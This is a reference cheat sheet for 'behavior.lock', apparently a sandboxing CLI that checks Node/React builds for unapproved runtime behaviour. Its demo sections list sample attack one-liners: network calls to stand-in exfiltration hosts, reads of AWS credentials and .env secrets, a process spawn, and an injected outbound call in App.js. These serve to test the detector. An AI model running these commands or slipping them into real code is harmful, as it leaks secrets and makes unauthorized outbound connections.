# behavior.lock · Testing Cheat Sheet & Judge Reference Guide

A concise reference manual for live demonstrations, judge evaluations, and testing any Node/React repository.

---

## 1. Global Setup (Run Once)
Makes the `behaviorlock` command globally accessible from any terminal or folder:
```bash
npm link
```

---

## 2. Automated Test Suite (13 Tests Passing)
Runs complete unit/integration verification (schema, normalizer, honeypots, diff engine, environment profiles, and worker isolation):
```bash
npm test
```

---

## 3. Parallel Matrix & Custom Worker Testing

### A. Run 3 Parallel Instances Concurrently
Spawns 3 sandboxed instances concurrently with isolated canary directories and trace files:
```bash
behaviorlock check --parallel 3 --env non-prod
```

### B. Assign Different Real Tasks to Different Workers (CLI)
Runs distinct commands across workers simultaneously in parallel:
```bash
behaviorlock check --env non-prod --tasks "npm test, node app.js, node test.js"
```

### C. Live Mixed Test (Clean Worker + Attacker Worker Concurrently)
Demonstrates Worker 1 passing clean tests while Worker 2 is blocked for an unauthorized outbound leak:
```bash
behaviorlock check --env non-prod --tasks "npm test, node -e require('https').get('https://malicious-leak.com')"
```
*(Result: Worker 1 passes with EXIT 0, Worker 2 fails with EXIT 1, CI pipeline gate is blocked).*

---

## 4. What Judges Can Enter into Custom Workers

Judges can enter **any real command** into the custom worker inputs in the Web Dashboard or `--tasks` in the CLI.

### Safe Developer Commands (Will Pass → `EXIT 0`)
Commands that stay within legitimate project boundaries:
- `npm test` *(Runs project test suite)*
- `node -e "console.log('Build completed')"` *(Script execution without unapproved syscalls)*
- `node -e "require('fs').readFileSync('package.json')"` *(Internal project file read)*
- `node -e "require('crypto').randomBytes(32)"` *(Local compute / encryption)*

### Attacker / Exploitative Commands (Will Fail → `EXIT 1`)
Real attack payloads intercepted by the sandbox:
- **Outbound Data Exfiltration:**  
  `node -e "require('https').get('https://attacker-c2.com')"`  
  *(Detected: `HIGH NETWORK_ANOMALY`)*
- **Sensitive Credential Access:**  
  `node -e "require('fs').readFileSync(process.env.USERPROFILE + '/.aws/credentials')"`  
  *(Detected: `CRITICAL FS_READ_ANOMALY`)*
- **Unauthorized Process / Reverse Shell:**  
  `node -e "require('child_process').execSync('whoami')"`  
  *(Detected: `HIGH PROCESS_SPAWN`)*
- **Canary Honeypot Directory Breach:**  
  `node -e "require('fs').readdirSync('behaviorlock-canary-ci-worker-1')"`  
  *(Detected: `CRITICAL SECRET_CANARY_TRIPWIRE`)*

---

## 5. How to Test on a React Project (e.g., Create-React-App, Vite React, Next.js)

Suppose you have a React project located at `C:\path\to\my-react-app`.

### Phase 1: Initialize the Baseline Contract (Clean State)
Run from inside the React project or use `--cwd`:
```bash
cd "C:\path\to\my-react-app"
behaviorlock init
```
*What happens:* It executes your project's build/test script (e.g., `npm test`), records baseline syscalls, and saves the verified profile to `behavior.lock`.

---

### Phase 2: Safe Test (Legitimate Code Execution)
Run the sandbox check:
```bash
behaviorlock check
```
**Expected Result:**
```
✔ CONTRACT SATISFIED · my-react-app
All observed runtime behaviors conform to committed policies in behavior.lock
EXIT CODE: 0
```

---

### Phase 3: Unsafe / Attack Test (Simulating Supply-Chain Tampering)

#### Option 1: Attack via CLI / Custom Worker Command
Run an untrusted payload against the React project:
```bash
behaviorlock check --cmd "node -e require('https').get('https://stolen-react-telemetry.io')"
```
**Expected Result:**
- Sandbox flags `HIGH NETWORK_ANOMALY`.
- CI pipeline blocks with **`EXIT 1`**.

#### Option 2: Attack via Real Code Tampering (Compromised Dependency / Script)
Add an unapproved outbound telemetry call inside any component or build file (e.g., `src/App.js` or `test.js`):
```javascript
// Malicious payload injected into React build or test
require('https').get('https://exfiltrate-tokens.org');
```
Run the check:
```bash
behaviorlock check
```
**Expected Result:**
- Flagged: `HIGH NETWORK_ANOMALY · exfiltrate-tokens.org:443`.
- Immediate exit with code `1`.

#### Option 3: Supply-Chain Stealing React `.env` Secrets
Simulate an installed npm dependency attempting to harvest environment variables:
```bash
behaviorlock check --cmd "node -e require('fs').readFileSync('.env.production')"
```
**Expected Result:**
- Flagged: `CRITICAL SECRET_CANARY_TRIPWIRE · Target matches protected credential pattern`.

---

## 6. Multi-Environment Profiles (`prod` vs `non-prod`)

### Check Under Production (Zero-Trust)
```bash
behaviorlock check --env prod
```

### Check Under Non-Production (Allows Test Fixtures & Local Mocks)
```bash
behaviorlock check --env non-prod
```

---

## 7. Attack Simulation Commands (Built-in Demo)

### Step 1: Inject Simulated Attack
```bash
behaviorlock simulate attack
```

### Step 2: Verify Interception (Fails with Exit Code 1)
```bash
behaviorlock check
```

### Step 3: Clean Up Test Files (1 Command)
```bash
behaviorlock simulate clean
```

---

## 8. Cryptographic Approvals & Audit Trail

### Approve a Legitimate Capability Drift
```bash
behaviorlock approve <violation-id> --reason "Vendor analytics verified by SecOps"
```

### Scope an Approval Strictly to Non-Production
```bash
behaviorlock approve <violation-id> --reason "Local WireMock mock permitted for test" --env non-prod
```

---

## 9. Web Security Studio Dashboard

### Launch Dashboard
```bash
behaviorlock ui
```
*(Runs on `http://localhost:4949`, or dev server on `http://localhost:5173`)*

### Key Dashboard Actions for Judges:
1. **Parallel Matrix:** Configure custom worker commands, click **`+ Add Custom Worker`**, and click **`Execute Parallel Check`**.
2. **Profile Switcher:** Toggle `PROD` vs `NON-PROD` in the top navbar.
3. **Approvals Drawer:** Click any flagged incident to generate cryptographically signed waivers.
